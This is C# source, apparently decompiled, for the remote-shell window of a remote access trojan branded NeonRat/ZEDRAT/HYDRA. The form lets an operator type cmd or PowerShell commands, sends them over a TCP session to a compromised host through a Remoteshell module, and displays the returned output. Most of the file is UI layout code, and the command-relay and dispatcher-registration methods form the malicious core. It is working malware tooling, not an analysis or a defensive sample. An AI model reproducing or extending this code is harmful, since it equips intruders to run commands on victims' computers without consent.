using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Bunifu.UI.WinForms.BunifuButton;
using Guna.UI2.WinForms;
using MetroSet_UI.Controls;
using MetroSet_UI.Enums;
using Sockets;
using ZEDRAT.Messages;
using ZEDRAT.Module;
using ZEDRAT.TCP;
using ZEDRatApp.Properties;

namespace NeonRat_R.A.T.UIDESIGN
{
	public class Remote_Shell : Form
	{
		private Label label2;

		public int FocusLength;

		public Point formPoint;

		public bool formMove;

		public string _ShellDataType;

		public TcpClientSession _tcs;

		public Remoteshell rs;

		private IContainer components;

		private TextBox textBox1;

		private BunifuTextBox textBox2;

		private BunifuIconButton bunifuIconButton2;

		private BunifuIconButton bunifuIconButton3;

		private BunifuLabel bunifuLabel5;

		public Button button3;

		private MetroSetControlBox metroSetControlBox1;

		private Guna2ShadowForm guna2ShadowForm1;

		private BunifuSeparator bunifuSeparator1;

		private BunifuSeparator bunifuSeparator4;

		private BunifuSeparator bunifuSeparator2;

		private BunifuToolTip bunifuToolTip1;

		public Remote_Shell()
		{
			this.InitializeComponent();
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void BarraTitulo_MouseDown(object sender, MouseEventArgs e)
		{
			Remote_Shell.ReleaseCapture();
			Remote_Shell.SendMessage(base.Handle, 274, 61458, 0);
		}

		public Remote_Shell(string FormText, TcpClientSession tcs)
		{
			this._ShellDataType = "cmd";
			this.InitializeComponent();
			this._tcs = tcs;
			this.rs = new Remoteshell(this._tcs);
		}

		private void button1_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		private void button2_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		private void button3_Click(object sender, EventArgs e)
		{
			this.FormSendCommand();
		}

		private void cmdToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this._ShellDataType = "cmd";
			this.button3.Text = "cmd";
		}

		private void FormSendCommand()
		{
			string text = this.textBox2.Text;
			if (!string.IsNullOrEmpty(text))
			{
				this.rs.ShellCommand(this._ShellDataType, text);
				this.textBox2.Text = null;
			}
		}

		private void panel1_MouseDown(object sender, MouseEventArgs e)
		{
			this.formPoint = default(Point);
			if (e.Button == MouseButtons.Left)
			{
				this.formPoint = new Point(-e.X - SystemInformation.FrameBorderSize.Width, -e.Y - SystemInformation.CaptionHeight - SystemInformation.FrameBorderSize.Height);
				this.formMove = true;
			}
		}

		private void panel1_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.formMove)
			{
				Point mousePosition = Control.MousePosition;
				mousePosition.Offset(this.formPoint.X, this.formPoint.Y);
				base.Location = mousePosition;
			}
		}

		private void panel1_MouseUp(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				this.formMove = false;
			}
		}

		private void ps1ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this._ShellDataType = "ps1";
			this.button3.Text = "ps1";
		}

		private void Remote_Shell_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				if (this._tcs == null)
				{
					_ = this._tcs;
				}
				else if (this._tcs._Idispatchar == null)
				{
					_ = this._tcs._Idispatchar;
				}
				else
				{
					this._tcs._Idispatchar.Unregister(DataType.RemoteShellType);
				}
				if (this.rs == null)
				{
					_ = this.rs;
				}
				else
				{
					this.rs.destroy();
				}
				this._tcs = null;
				this.rs = null;
				GC.Collect();
			}
			catch
			{
			}
		}

		private void Remote_Shell_Load(object sender, EventArgs e)
		{
			this._tcs._Idispatchar.Register(DataType.RemoteShellType, new Action<TcpClientSession, byte[]>(this.rs.RemoteShellExecute));
			this.rs._FormExecute = new Action<RemoteShell_Messages>(UpdateRemoteShell_Form);
		}

		public void UpdateRemoteShell_Form(RemoteShell_Messages rsm)
		{
			if (rsm._ShellDataType.Equals("command"))
			{
				base.Invoke((MethodInvoker)delegate
				{
					this.textBox1.Text += rsm._Command;
					this.FocusLength += rsm._Command.Length;
					this.textBox1.SelectionStart = this.FocusLength;
					this.textBox1.Focus();
					this.textBox1.ScrollToCaret();
				});
			}
			if (rsm._ShellDataType.Equals("status"))
			{
				base.Invoke((MethodInvoker)delegate
				{
					this.label2.Text = rsm._Command;
				});
			}
		}

		private void bunifuIconButton2_Click(object sender, EventArgs e)
		{
			this.bunifuLabel5.Text = "Remote CMD";
			this._ShellDataType = "cmd";
			this.button3.Text = "cmd";
		}

		private void bunifuIconButton3_Click(object sender, EventArgs e)
		{
			this.bunifuLabel5.Text = "Remote Powershell";
			this._ShellDataType = "ps1";
			this.button3.Text = "ps1";
		}

		private void textBox2_KeyDown(object sender, KeyEventArgs e)
		{
			if (e.KeyCode == Keys.Return)
			{
				this.FormSendCommand();
				e.Handled = true;
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			this.components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(NeonRat_R.A.T.UIDESIGN.Remote_Shell));
			Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
			Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties2 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
			Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties3 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
			Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties4 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges2 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			this.textBox1 = new System.Windows.Forms.TextBox();
			this.textBox2 = new Bunifu.UI.WinForms.BunifuTextBox();
			this.bunifuIconButton2 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton3 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuLabel5 = new Bunifu.UI.WinForms.BunifuLabel();
			this.button3 = new System.Windows.Forms.Button();
			this.metroSetControlBox1 = new MetroSet_UI.Controls.MetroSetControlBox();
			this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
			this.bunifuSeparator4 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator1 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator2 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuToolTip1 = new Bunifu.UI.WinForms.BunifuToolTip(this.components);
			base.SuspendLayout();
			this.textBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.textBox1.BackColor = System.Drawing.Color.Black;
			this.textBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
			this.textBox1.ForeColor = System.Drawing.Color.FromArgb(190, 190, 190);
			this.textBox1.Location = new System.Drawing.Point(7, 53);
			this.textBox1.Multiline = true;
			this.textBox1.Name = "textBox1";
			this.textBox1.ScrollBars = System.Windows.Forms.ScrollBars.Both;
			this.textBox1.Size = new System.Drawing.Size(939, 450);
			this.textBox1.TabIndex = 2;
			this.bunifuToolTip1.SetToolTip(this.textBox1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.textBox1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.textBox1, "");
			this.textBox2.AcceptsReturn = false;
			this.textBox2.AcceptsTab = false;
			this.textBox2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.textBox2.AnimationSpeed = 200;
			this.textBox2.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
			this.textBox2.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
			this.textBox2.AutoSizeHeight = true;
			this.textBox2.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.textBox2.BackgroundImage = (System.Drawing.Image)resources.GetObject("textBox2.BackgroundImage");
			this.textBox2.BorderColorActive = System.Drawing.Color.FromArgb(9, 8, 13);
			this.textBox2.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
			this.textBox2.BorderColorHover = System.Drawing.Color.FromArgb(9, 8, 13);
			this.textBox2.BorderColorIdle = System.Drawing.Color.FromArgb(226, 28, 71);
			this.textBox2.BorderRadius = 1;
			this.textBox2.BorderThickness = 1;
			this.textBox2.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
			this.textBox2.Cursor = System.Windows.Forms.Cursors.IBeam;
			this.textBox2.DefaultFont = new System.Drawing.Font("Century Gothic", 11.25f);
			this.textBox2.DefaultText = "";
			this.textBox2.FillColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.textBox2.HideSelection = true;
			this.textBox2.IconLeft = null;
			this.textBox2.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
			this.textBox2.IconPadding = 10;
			this.textBox2.IconRight = null;
			this.textBox2.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
			this.textBox2.Lines = new string[0];
			this.textBox2.Location = new System.Drawing.Point(12, 510);
			this.textBox2.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
			this.textBox2.MaxLength = 32767;
			this.textBox2.MinimumSize = new System.Drawing.Size(2, 2);
			this.textBox2.Modified = false;
			this.textBox2.Multiline = false;
			this.textBox2.Name = "textBox2";
			stateProperties.BorderColor = System.Drawing.Color.FromArgb(9, 8, 13);
			stateProperties.FillColor = System.Drawing.Color.Empty;
			stateProperties.ForeColor = System.Drawing.Color.Empty;
			stateProperties.PlaceholderForeColor = System.Drawing.Color.Empty;
			this.textBox2.OnActiveState = stateProperties;
			stateProperties2.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
			stateProperties2.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
			stateProperties2.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
			stateProperties2.PlaceholderForeColor = System.Drawing.Color.DarkGray;
			this.textBox2.OnDisabledState = stateProperties2;
			stateProperties3.BorderColor = System.Drawing.Color.FromArgb(9, 8, 13);
			stateProperties3.FillColor = System.Drawing.Color.Empty;
			stateProperties3.ForeColor = System.Drawing.Color.Empty;
			stateProperties3.PlaceholderForeColor = System.Drawing.Color.Empty;
			this.textBox2.OnHoverState = stateProperties3;
			stateProperties4.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			stateProperties4.FillColor = System.Drawing.Color.FromArgb(9, 8, 13);
			stateProperties4.ForeColor = System.Drawing.Color.Empty;
			stateProperties4.PlaceholderForeColor = System.Drawing.Color.Empty;
			this.textBox2.OnIdleState = stateProperties4;
			this.textBox2.Padding = new System.Windows.Forms.Padding(3, 4, 3, 4);
			this.textBox2.PasswordChar = '\0';
			this.textBox2.PlaceholderForeColor = System.Drawing.Color.Silver;
			this.textBox2.PlaceholderText = "Command Line Parameters";
			this.textBox2.ReadOnly = false;
			this.textBox2.ScrollBars = System.Windows.Forms.ScrollBars.None;
			this.textBox2.SelectedText = "";
			this.textBox2.SelectionLength = 0;
			this.textBox2.SelectionStart = 0;
			this.textBox2.ShortcutsEnabled = true;
			this.textBox2.Size = new System.Drawing.Size(735, 44);
			this.textBox2.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Material;
			this.textBox2.TabIndex = 60;
			this.textBox2.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
			this.textBox2.TextMarginBottom = 0;
			this.textBox2.TextMarginLeft = 3;
			this.textBox2.TextMarginTop = 1;
			this.textBox2.TextPlaceholder = "Command Line Parameters";
			this.bunifuToolTip1.SetToolTip(this.textBox2, "");
			this.bunifuToolTip1.SetToolTipIcon(this.textBox2, null);
			this.bunifuToolTip1.SetToolTipTitle(this.textBox2, "");
			this.textBox2.UseSystemPasswordChar = false;
			this.textBox2.WordWrap = true;
			this.textBox2.KeyDown += new System.Windows.Forms.KeyEventHandler(textBox2_KeyDown);
			this.bunifuIconButton2.AllowAnimations = true;
			this.bunifuIconButton2.AllowBorderColorChanges = true;
			this.bunifuIconButton2.AllowMouseEffects = true;
			this.bunifuIconButton2.AnimationSpeed = 200;
			this.bunifuIconButton2.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton2.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton2.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton2.BorderRadius = 1;
			this.bunifuIconButton2.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton2.BorderThickness = 1;
			this.bunifuIconButton2.ColorContrastOnClick = 30;
			this.bunifuIconButton2.ColorContrastOnHover = 30;
			this.bunifuIconButton2.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges.BottomLeft = true;
			borderEdges.BottomRight = true;
			borderEdges.TopLeft = true;
			borderEdges.TopRight = true;
			this.bunifuIconButton2.CustomizableEdges = borderEdges;
			this.bunifuIconButton2.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton2.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton2.Image");
			this.bunifuIconButton2.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton2.Location = new System.Drawing.Point(12, 8);
			this.bunifuIconButton2.Name = "bunifuIconButton2";
			this.bunifuIconButton2.RoundBorders = false;
			this.bunifuIconButton2.ShowBorders = true;
			this.bunifuIconButton2.Size = new System.Drawing.Size(35, 35);
			this.bunifuIconButton2.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton2.TabIndex = 87;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton2, "Switch to CMD!");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton2, ZEDRatApp.Properties.Resources.logoll);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton2, "HYDRA");
			this.bunifuIconButton2.Click += new System.EventHandler(bunifuIconButton2_Click);
			this.bunifuIconButton3.AllowAnimations = true;
			this.bunifuIconButton3.AllowBorderColorChanges = true;
			this.bunifuIconButton3.AllowMouseEffects = true;
			this.bunifuIconButton3.AnimationSpeed = 200;
			this.bunifuIconButton3.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton3.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton3.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton3.BorderRadius = 1;
			this.bunifuIconButton3.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton3.BorderThickness = 1;
			this.bunifuIconButton3.ColorContrastOnClick = 30;
			this.bunifuIconButton3.ColorContrastOnHover = 30;
			this.bunifuIconButton3.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges2.BottomLeft = true;
			borderEdges2.BottomRight = true;
			borderEdges2.TopLeft = true;
			borderEdges2.TopRight = true;
			this.bunifuIconButton3.CustomizableEdges = borderEdges2;
			this.bunifuIconButton3.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton3.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton3.Image");
			this.bunifuIconButton3.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton3.Location = new System.Drawing.Point(53, 8);
			this.bunifuIconButton3.Name = "bunifuIconButton3";
			this.bunifuIconButton3.RoundBorders = false;
			this.bunifuIconButton3.ShowBorders = true;
			this.bunifuIconButton3.Size = new System.Drawing.Size(35, 35);
			this.bunifuIconButton3.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton3.TabIndex = 88;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton3, "Switch to Powershell!");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton3, ZEDRatApp.Properties.Resources.logoll);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton3, "HYDRA");
			this.bunifuIconButton3.Click += new System.EventHandler(bunifuIconButton3_Click);
			this.bunifuLabel5.AllowParentOverrides = false;
			this.bunifuLabel5.AutoEllipsis = false;
			this.bunifuLabel5.CursorType = null;
			this.bunifuLabel5.Font = new System.Drawing.Font("Century Gothic", 11.25f);
			this.bunifuLabel5.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.bunifuLabel5.Location = new System.Drawing.Point(94, 23);
			this.bunifuLabel5.Name = "bunifuLabel5";
			this.bunifuLabel5.RightToLeft = System.Windows.Forms.RightToLeft.No;
			this.bunifuLabel5.Size = new System.Drawing.Size(99, 20);
			this.bunifuLabel5.TabIndex = 89;
			this.bunifuLabel5.Text = "Remote CMD";
			this.bunifuLabel5.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
			this.bunifuLabel5.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
			this.bunifuToolTip1.SetToolTip(this.bunifuLabel5, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuLabel5, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuLabel5, "");
			this.button3.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.button3.BackgroundImage = (System.Drawing.Image)resources.GetObject("button3.BackgroundImage");
			this.button3.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.button3.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.button3.FlatAppearance.BorderSize = 0;
			this.button3.FlatAppearance.CheckedBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.button3.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.button3.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.button3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
			this.button3.Font = new System.Drawing.Font("Century Gothic", 11.25f);
			this.button3.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.button3.Location = new System.Drawing.Point(765, 509);
			this.button3.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
			this.button3.Name = "button3";
			this.button3.Size = new System.Drawing.Size(158, 44);
			this.button3.TabIndex = 90;
			this.button3.Text = "CMD";
			this.bunifuToolTip1.SetToolTip(this.button3, "Send command!");
			this.bunifuToolTip1.SetToolTipIcon(this.button3, ZEDRatApp.Properties.Resources.logoll);
			this.bunifuToolTip1.SetToolTipTitle(this.button3, "HYDRA");
			this.button3.UseVisualStyleBackColor = true;
			this.button3.Click += new System.EventHandler(button3_Click);
			this.metroSetControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.metroSetControlBox1.CloseHoverBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.metroSetControlBox1.CloseHoverForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.metroSetControlBox1.CloseNormalForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.DisabledForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.IsDerivedStyle = true;
			this.metroSetControlBox1.Location = new System.Drawing.Point(830, 4);
			this.metroSetControlBox1.MaximizeBox = true;
			this.metroSetControlBox1.MaximizeHoverBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.metroSetControlBox1.MaximizeHoverForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.metroSetControlBox1.MaximizeNormalForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.MinimizeBox = true;
			this.metroSetControlBox1.MinimizeHoverBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.metroSetControlBox1.MinimizeHoverForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.metroSetControlBox1.MinimizeNormalForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.Name = "metroSetControlBox1";
			this.metroSetControlBox1.Size = new System.Drawing.Size(100, 25);
			this.metroSetControlBox1.Style = MetroSet_UI.Enums.Style.Custom;
			this.metroSetControlBox1.StyleManager = null;
			this.metroSetControlBox1.TabIndex = 158;
			this.metroSetControlBox1.Text = "metroSetControlBox1";
			this.metroSetControlBox1.ThemeAuthor = "Narwin";
			this.metroSetControlBox1.ThemeName = "MetroLite";
			this.bunifuToolTip1.SetToolTip(this.metroSetControlBox1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.metroSetControlBox1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.metroSetControlBox1, "");
			this.guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ShadowForm1.TargetForm = this;
			this.bunifuSeparator4.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.bunifuSeparator4.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator4.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator4.BackgroundImage");
			this.bunifuSeparator4.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator4.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator4.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator4.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator4.LineThickness = 1;
			this.bunifuSeparator4.Location = new System.Drawing.Point(-6, -2);
			this.bunifuSeparator4.Margin = new System.Windows.Forms.Padding(5, 11, 5, 11);
			this.bunifuSeparator4.Name = "bunifuSeparator4";
			this.bunifuSeparator4.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Vertical;
			this.bunifuSeparator4.Size = new System.Drawing.Size(12, 554);
			this.bunifuSeparator4.TabIndex = 253;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator4, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator4, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator4, "");
			this.bunifuSeparator1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator1.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator1.BackgroundImage");
			this.bunifuSeparator1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator1.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator1.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator1.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator1.LineThickness = 1;
			this.bunifuSeparator1.Location = new System.Drawing.Point(926, -1);
			this.bunifuSeparator1.Margin = new System.Windows.Forms.Padding(6, 14, 6, 14);
			this.bunifuSeparator1.Name = "bunifuSeparator1";
			this.bunifuSeparator1.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Vertical;
			this.bunifuSeparator1.Size = new System.Drawing.Size(12, 554);
			this.bunifuSeparator1.TabIndex = 254;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator1, "");
			this.bunifuSeparator2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator2.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator2.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator2.BackgroundImage");
			this.bunifuSeparator2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator2.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator2.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator2.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator2.LineThickness = 1;
			this.bunifuSeparator2.Location = new System.Drawing.Point(1, -5);
			this.bunifuSeparator2.Margin = new System.Windows.Forms.Padding(6, 11, 6, 11);
			this.bunifuSeparator2.Name = "bunifuSeparator2";
			this.bunifuSeparator2.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator2.Size = new System.Drawing.Size(930, 10);
			this.bunifuSeparator2.TabIndex = 255;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator2, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator2, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator2, "");
			this.bunifuToolTip1.Active = true;
			this.bunifuToolTip1.AlignTextWithTitle = false;
			this.bunifuToolTip1.AllowAutoClose = false;
			this.bunifuToolTip1.AllowFading = true;
			this.bunifuToolTip1.AutoCloseDuration = 5000;
			this.bunifuToolTip1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.bunifuToolTip1.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuToolTip1.ClickToShowDisplayControl = false;
			this.bunifuToolTip1.ConvertNewlinesToBreakTags = true;
			this.bunifuToolTip1.DisplayControl = null;
			this.bunifuToolTip1.EntryAnimationSpeed = 350;
			this.bunifuToolTip1.ExitAnimationSpeed = 200;
			this.bunifuToolTip1.GenerateAutoCloseDuration = false;
			this.bunifuToolTip1.IconMargin = 6;
			this.bunifuToolTip1.InitialDelay = 0;
			this.bunifuToolTip1.Name = "bunifuToolTip1";
			this.bunifuToolTip1.Opacity = 1.0;
			this.bunifuToolTip1.OverrideToolTipTitles = false;
			this.bunifuToolTip1.Padding = new System.Windows.Forms.Padding(10);
			this.bunifuToolTip1.ReshowDelay = 100;
			this.bunifuToolTip1.ShowAlways = true;
			this.bunifuToolTip1.ShowBorders = false;
			this.bunifuToolTip1.ShowIcons = true;
			this.bunifuToolTip1.ShowShadows = true;
			this.bunifuToolTip1.Tag = null;
			this.bunifuToolTip1.TextFont = new System.Drawing.Font("Century Gothic", 11.25f);
			this.bunifuToolTip1.TextForeColor = System.Drawing.Color.White;
			this.bunifuToolTip1.TextMargin = 2;
			this.bunifuToolTip1.TitleFont = new System.Drawing.Font("Century Gothic", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.bunifuToolTip1.TitleForeColor = System.Drawing.Color.Silver;
			this.bunifuToolTip1.ToolTipPosition = new System.Drawing.Point(0, 0);
			this.bunifuToolTip1.ToolTipTitle = "NeonRat";
			base.AutoScaleDimensions = new System.Drawing.SizeF(7f, 16f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(933, 554);
			base.Controls.Add(this.bunifuSeparator2);
			base.Controls.Add(this.bunifuSeparator1);
			base.Controls.Add(this.bunifuSeparator4);
			base.Controls.Add(this.metroSetControlBox1);
			base.Controls.Add(this.button3);
			base.Controls.Add(this.bunifuLabel5);
			base.Controls.Add(this.bunifuIconButton3);
			base.Controls.Add(this.bunifuIconButton2);
			base.Controls.Add(this.textBox2);
			base.Controls.Add(this.textBox1);
			this.Font = new System.Drawing.Font("Century Gothic", 8.25f);
			this.ForeColor = System.Drawing.Color.WhiteSmoke;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
			base.Name = "Remote_Shell";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Remote_Shell";
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(Remote_Shell_FormClosed);
			base.Load += new System.EventHandler(Remote_Shell_Load);
			base.MouseDown += new System.Windows.Forms.MouseEventHandler(BarraTitulo_MouseDown);
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
